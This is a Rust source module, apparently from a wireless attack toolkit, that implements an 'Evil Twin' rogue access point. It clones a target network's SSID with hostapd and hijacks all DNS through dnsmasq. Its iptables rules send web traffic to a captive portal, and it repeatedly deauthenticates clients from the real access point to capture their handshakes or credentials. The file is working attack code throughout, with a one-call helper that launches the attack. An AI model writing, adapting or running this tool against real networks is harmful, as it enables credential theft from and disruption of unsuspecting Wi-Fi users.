//! Evil Twin Access Point
//!
//! Create a rogue access point that mimics a legitimate network.
//! When clients connect, their credentials can be captured.
//!
//! ## How it works
//! 1. Scan for target network to get SSID, channel, security settings
//! 2. Create fake AP with same SSID (optionally on different channel)
//! 3. Deauth clients from real AP to force reconnection
//! 4. Clients may connect to our fake AP
//! 5. Capture EAPOL handshakes or serve captive portal
//!
//! ## Requirements
//! - Two wireless interfaces (one for AP, one for deauth)
//! - Or single interface if not doing simultaneous deauth
//! - hostapd for AP creation (or native beacon injection)

use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use std::process::{Command, Child, Stdio};
use std::time::{Duration, Instant};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;

use crate::error::{WirelessError, Result};
use crate::frames::MacAddress;
use crate::interface::WirelessInterface;
use crate::capture::{PacketCapture, CaptureFilter};
use crate::handshake::{HandshakeCapture, HandshakeState};
use crate::deauth::{DeauthAttacker, DeauthConfig};

/// Evil Twin configuration
#[derive(Debug, Clone)]
pub struct EvilTwinConfig {
    /// SSID to impersonate
    pub ssid: String,
    /// Channel to operate on (0 = same as target)
    pub channel: u8,
    /// Interface for the fake AP
    pub ap_interface: String,
    /// Interface for deauth (optional, can be same as ap_interface if not simultaneous)
    pub deauth_interface: Option<String>,
    /// Target BSSID to deauth clients from
    pub target_bssid: Option<MacAddress>,
    /// Run deauth attack simultaneously
    pub simultaneous_deauth: bool,
    /// Deauth burst interval
    pub deauth_interval: Duration,
    /// Total attack duration
    pub duration: Duration,
    /// Use open network (no password) - captive portal style
    pub open_network: bool,
    /// WPA2 password for the fake AP (if not open)
    pub wpa_password: Option<String>,
    /// Path to store captured data
    pub capture_path: String,
}

impl Default for EvilTwinConfig {
    fn default() -> Self {
        Self {
            ssid: String::new(),
            channel: 6,
            ap_interface: "wlan0".to_string(),
            deauth_interface: None,
            target_bssid: None,
            simultaneous_deauth: false,
            deauth_interval: Duration::from_secs(5),
            duration: Duration::from_secs(300), // 5 minutes
            open_network: true, // Default to open for captive portal
            wpa_password: None,
            capture_path: "/tmp/evil_twin".to_string(),
        }
    }
}

impl EvilTwinConfig {
    /// Create config for specific target
    pub fn for_target(ssid: &str, bssid: MacAddress, channel: u8) -> Self {
        Self {
            ssid: ssid.to_string(),
            channel,
            target_bssid: Some(bssid),
            ..Default::default()
        }
    }
    
    /// Set interfaces
    pub fn with_interfaces(mut self, ap: &str, deauth: Option<&str>) -> Self {
        self.ap_interface = ap.to_string();
        self.deauth_interface = deauth.map(|s| s.to_string());
        self
    }
    
    /// Enable simultaneous deauth
    pub fn with_deauth(mut self, enabled: bool) -> Self {
        self.simultaneous_deauth = enabled;
        self
    }
    
    /// Set duration
    pub fn with_duration(mut self, duration: Duration) -> Self {
        self.duration = duration;
        self
    }
}

/// Evil Twin attack statistics
#[derive(Debug, Clone, Default)]
pub struct EvilTwinStats {
    /// Attack duration
    pub duration: Duration,
    /// Number of clients that connected
    pub clients_connected: u32,
    /// Number of handshakes captured
    pub handshakes_captured: u32,
    /// Number of deauth packets sent
    pub deauth_packets: u64,
    /// Credentials captured (if captive portal)
    pub credentials_captured: u32,
    /// AP was successfully started
    pub ap_started: bool,
}

/// Evil Twin attack controller
pub struct EvilTwin {
    config: EvilTwinConfig,
    stop_flag: Arc<AtomicBool>,
    hostapd_process: Option<Child>,
    dnsmasq_process: Option<Child>,
}

impl EvilTwin {
    /// Create new Evil Twin attack
    pub fn new(config: EvilTwinConfig) -> Self {
        Self {
            config,
            stop_flag: Arc::new(AtomicBool::new(false)),
            hostapd_process: None,
            dnsmasq_process: None,
        }
    }
    
    /// Check if required tools are available
    pub fn check_requirements() -> Result<Vec<String>> {
        let mut missing = Vec::new();
        
        let tools = ["hostapd", "dnsmasq", "iptables"];
        for tool in tools {
            if Command::new("which").arg(tool).output().map(|o| !o.status.success()).unwrap_or(true) {
                missing.push(tool.to_string());
            }
        }
        
        Ok(missing)
    }
    
    /// Start the Evil Twin attack
    pub fn start(&mut self) -> Result<EvilTwinStats> {
        log::info!("Starting Evil Twin attack for SSID: {}", self.config.ssid);
        
        let mut stats = EvilTwinStats::default();
        let start = Instant::now();
        
        // Create capture directory
        fs::create_dir_all(&self.config.capture_path)
            .map_err(|e| WirelessError::System(format!("Failed to create capture dir: {}", e)))?;
        
        // Setup the AP interface
        self.setup_ap_interface()?;
        
        // Generate and start hostapd
        self.start_hostapd()?;
        stats.ap_started = true;
        
        // Start DHCP server
        self.start_dnsmasq()?;
        
        // Setup NAT/iptables for captive portal
        if self.config.open_network {
            self.setup_captive_portal()?;
        }
        
        // Start handshake capture
        let handshake_capture = if !self.config.open_network {
            Some(Arc::new(std::sync::Mutex::new(
                HandshakeCapture::new(
                    self.get_ap_mac()?,
                    None,
                )
            )))
        } else {
            None
        };
        
        // Start deauth thread if configured
        let deauth_handle = if self.config.simultaneous_deauth {
            if let (Some(ref deauth_iface), Some(ref target)) = 
                (&self.config.deauth_interface, &self.config.target_bssid) 
            {
                let iface = deauth_iface.clone();
                let bssid = *target;
                let interval = self.config.deauth_interval;
                let stop = Arc::clone(&self.stop_flag);
                let duration = self.config.duration;
                
                Some(thread::spawn(move || {
                    Self::deauth_loop(&iface, bssid, interval, duration, stop)
                }))
            } else {
                None
            }
        } else {
            None
        };
        
        // Monitor for connections/handshakes
        let capture_stop = Arc::clone(&self.stop_flag);
        let ap_iface = self.config.ap_interface.clone();
        
        while start.elapsed() < self.config.duration && !self.stop_flag.load(Ordering::Relaxed) {
            thread::sleep(Duration::from_secs(1));
            
            // Check for connected clients
            if let Ok(clients) = self.get_connected_clients() {
                if clients > stats.clients_connected {
                    log::info!("{} clients connected to fake AP", clients);
                    stats.clients_connected = clients;
                }
            }
        }
        
        // Stop and cleanup
        self.stop_flag.store(true, Ordering::Relaxed);
        
        if let Some(handle) = deauth_handle {
            if let Ok(deauth_stats) = handle.join() {
                stats.deauth_packets = deauth_stats.unwrap_or(0);
            }
        }
        
        stats.duration = start.elapsed();
        
        // Cleanup
        self.cleanup()?;
        
        log::info!(
            "Evil Twin attack complete: {} clients, {} handshakes in {:?}",
            stats.clients_connected,
            stats.handshakes_captured,
            stats.duration
        );
        
        Ok(stats)
    }
    
    /// Stop the attack
    pub fn stop(&mut self) {
        self.stop_flag.store(true, Ordering::Relaxed);
        let _ = self.cleanup();
    }
    
    /// Setup AP interface (set IP, etc.)
    fn setup_ap_interface(&self) -> Result<()> {
        let iface = &self.config.ap_interface;
        
        // Bring interface down
        Command::new("ip")
            .args(["link", "set", iface, "down"])
            .output()
            .map_err(|e| WirelessError::System(format!("ip link down failed: {}", e)))?;
        
        // Set IP address for AP
        Command::new("ip")
            .args(["addr", "flush", "dev", iface])
            .output()
            .ok();
        
        Command::new("ip")
            .args(["addr", "add", "192.168.4.1/24", "dev", iface])
            .output()
            .map_err(|e| WirelessError::System(format!("ip addr add failed: {}", e)))?;
        
        // Bring interface up
        Command::new("ip")
            .args(["link", "set", iface, "up"])
            .output()
            .map_err(|e| WirelessError::System(format!("ip link up failed: {}", e)))?;
        
        Ok(())
    }
    
    /// Generate and start hostapd
    fn start_hostapd(&mut self) -> Result<()> {
        let conf_path = format!("{}/hostapd.conf", self.config.capture_path);
        
        let config = if self.config.open_network {
            format!(
                "interface={}\n\
                driver=nl80211\n\
                ssid={}\n\
                hw_mode=g\n\
                channel={}\n\
                wmm_enabled=0\n\
                macaddr_acl=0\n\
                auth_algs=1\n\
                ignore_broadcast_ssid=0\n\
                wpa=0\n",
                self.config.ap_interface,
                self.config.ssid,
                self.config.channel
            )
        } else {
            let password = self.config.wpa_password.as_deref().unwrap_or("password123");
            format!(
                "interface={}\n\
                driver=nl80211\n\
                ssid={}\n\
                hw_mode=g\n\
                channel={}\n\
                wmm_enabled=0\n\
                macaddr_acl=0\n\
                auth_algs=1\n\
                ignore_broadcast_ssid=0\n\
                wpa=2\n\
                wpa_passphrase={}\n\
                wpa_key_mgmt=WPA-PSK\n\
                wpa_pairwise=TKIP\n\
                rsn_pairwise=CCMP\n",
                self.config.ap_interface,
                self.config.ssid,
                self.config.channel,
                password
            )
        };
        
        fs::write(&conf_path, &config)
            .map_err(|e| WirelessError::System(format!("Failed to write hostapd.conf: {}", e)))?;
        
        let child = Command::new("hostapd")
            .arg(&conf_path)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|e| WirelessError::System(format!("Failed to start hostapd: {}", e)))?;
        
        self.hostapd_process = Some(child);
        
        // Wait for AP to start
        thread::sleep(Duration::from_secs(2));
        
        log::info!("Hostapd started for SSID: {}", self.config.ssid);
        Ok(())
    }
    
    /// Start DHCP server
    fn start_dnsmasq(&mut self) -> Result<()> {
        let conf_path = format!("{}/dnsmasq.conf", self.config.capture_path);
        let iface = &self.config.ap_interface;
        
        let config = format!(
            "interface={}\n\
            dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,12h\n\
            dhcp-option=3,192.168.4.1\n\
            dhcp-option=6,192.168.4.1\n\
            server=8.8.8.8\n\
            log-queries\n\
            log-dhcp\n\
            listen-address=192.168.4.1\n\
            bind-interfaces\n",
            iface
        );
        
        // If captive portal, redirect all DNS to us
        let config = if self.config.open_network {
            format!("{}address=/#/192.168.4.1\n", config)
        } else {
            config
        };
        
        fs::write(&conf_path, &config)
            .map_err(|e| WirelessError::System(format!("Failed to write dnsmasq.conf: {}", e)))?;
        
        // Kill any existing dnsmasq
        Command::new("pkill").args(["-9", "dnsmasq"]).output().ok();
        
        let child = Command::new("dnsmasq")
            .args(["-C", &conf_path, "-d"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|e| WirelessError::System(format!("Failed to start dnsmasq: {}", e)))?;
        
        self.dnsmasq_process = Some(child);
        
        log::info!("DHCP server started");
        Ok(())
    }
    
    /// Setup captive portal redirect
    fn setup_captive_portal(&self) -> Result<()> {
        let iface = &self.config.ap_interface;
        
        // Enable IP forwarding
        fs::write("/proc/sys/net/ipv4/ip_forward", "1")
            .map_err(|e| WirelessError::System(format!("Failed to enable IP forward: {}", e)))?;
        
        // Setup iptables for captive portal
        let commands = [
            // Flush existing rules
            vec!["iptables", "-t", "nat", "-F"],
            vec!["iptables", "-F"],
            // Redirect HTTP to our portal
            vec!["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, 
                 "-p", "tcp", "--dport", "80", "-j", "DNAT", 
                 "--to-destination", "192.168.4.1:80"],
            // Redirect HTTPS 
            vec!["iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface,
                 "-p", "tcp", "--dport", "443", "-j", "DNAT",
                 "--to-destination", "192.168.4.1:80"],
            // Accept forwarding
            vec!["iptables", "-A", "FORWARD", "-i", iface, "-j", "ACCEPT"],
        ];
        
        for cmd in commands {
            Command::new(cmd[0])
                .args(&cmd[1..])
                .output()
                .map_err(|e| WirelessError::System(format!("iptables failed: {}", e)))?;
        }
        
        log::info!("Captive portal iptables configured");
        Ok(())
    }
    
    /// Get number of connected clients
    fn get_connected_clients(&self) -> Result<u32> {
        // Check hostapd control interface or parse iw output
        let output = Command::new("iw")
            .args(["dev", &self.config.ap_interface, "station", "dump"])
            .output()
            .map_err(|e| WirelessError::System(format!("iw station dump failed: {}", e)))?;
        
        let stdout = String::from_utf8_lossy(&output.stdout);
        let count = stdout.matches("Station").count() as u32;
        Ok(count)
    }
    
    /// Get our AP's MAC address
    fn get_ap_mac(&self) -> Result<MacAddress> {
        let path = format!("/sys/class/net/{}/address", self.config.ap_interface);
        let mac_str = fs::read_to_string(&path)
            .map_err(|e| WirelessError::System(format!("Failed to read MAC: {}", e)))?;
        
        mac_str.trim().parse()
            .map_err(|e| WirelessError::InvalidMac(format!("{}", e)))
    }
    
    /// Deauth loop for simultaneous attack
    fn deauth_loop(
        interface: &str,
        bssid: MacAddress,
        interval: Duration,
        total_duration: Duration,
        stop: Arc<AtomicBool>,
    ) -> Result<u64> {
        let mut iface = WirelessInterface::new(interface)?;
        iface.set_monitor_mode()?;
        
        let mut attacker = DeauthAttacker::new(&iface)?;
        let mut total_sent = 0u64;
        let start = Instant::now();
        
        while start.elapsed() < total_duration && !stop.load(Ordering::Relaxed) {
            let config = DeauthConfig {
                packets_per_burst: 32,
                duration: Duration::from_secs(1),
                ..Default::default()
            };
            
            if let Ok(stats) = attacker.attack(bssid, None, config) {
                total_sent += stats.packets_sent;
            }
            
            thread::sleep(interval);
        }
        
        iface.set_managed_mode()?;
        Ok(total_sent)
    }
    
    /// Cleanup processes and network config
    fn cleanup(&mut self) -> Result<()> {
        log::info!("Cleaning up Evil Twin...");
        
        // Stop hostapd
        if let Some(mut child) = self.hostapd_process.take() {
            let _ = child.kill();
            let _ = child.wait();
        }
        
        // Stop dnsmasq
        if let Some(mut child) = self.dnsmasq_process.take() {
            let _ = child.kill();
            let _ = child.wait();
        }
        
        // Also pkill in case they're orphaned
        Command::new("pkill").args(["-9", "hostapd"]).output().ok();
        Command::new("pkill").args(["-9", "dnsmasq"]).output().ok();
        
        // Flush iptables
        Command::new("iptables").args(["-t", "nat", "-F"]).output().ok();
        Command::new("iptables").args(["-F"]).output().ok();
        
        // Reset interface
        let iface = &self.config.ap_interface;
        Command::new("ip").args(["addr", "flush", "dev", iface]).output().ok();
        Command::new("ip").args(["link", "set", iface, "down"]).output().ok();
        
        // Restart NetworkManager to restore normal operation
        Command::new("systemctl").args(["restart", "NetworkManager"]).output().ok();
        
        Ok(())
    }
}

impl Drop for EvilTwin {
    fn drop(&mut self) {
        let _ = self.cleanup();
    }
}

/// Quick Evil Twin attack function
pub fn quick_evil_twin(
    ssid: &str,
    target_bssid: Option<&str>,
    channel: u8,
    ap_interface: &str,
    duration_secs: u64,
) -> Result<EvilTwinStats> {
    let target = if let Some(bssid_str) = target_bssid {
        Some(bssid_str.parse().map_err(|e| WirelessError::InvalidMac(format!("{}", e)))?)
    } else {
        None
    };
    
    let config = EvilTwinConfig {
        ssid: ssid.to_string(),
        channel,
        ap_interface: ap_interface.to_string(),
        target_bssid: target,
        duration: Duration::from_secs(duration_secs),
        ..Default::default()
    };
    
    let mut attack = EvilTwin::new(config);
    attack.start()
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_evil_twin_config() {
        let config = EvilTwinConfig::default();
        assert!(config.open_network);
        assert_eq!(config.channel, 6);
        
        let config = EvilTwinConfig::for_target(
            "TestNetwork",
            "AA:BB:CC:DD:EE:FF".parse().unwrap(),
            11,
        );
        assert_eq!(config.ssid, "TestNetwork");
        assert_eq!(config.channel, 11);
    }
    
    #[test]
    fn test_requirements_check() {
        // Just ensure it doesn't panic
        let _ = EvilTwin::check_requirements();
    }
}
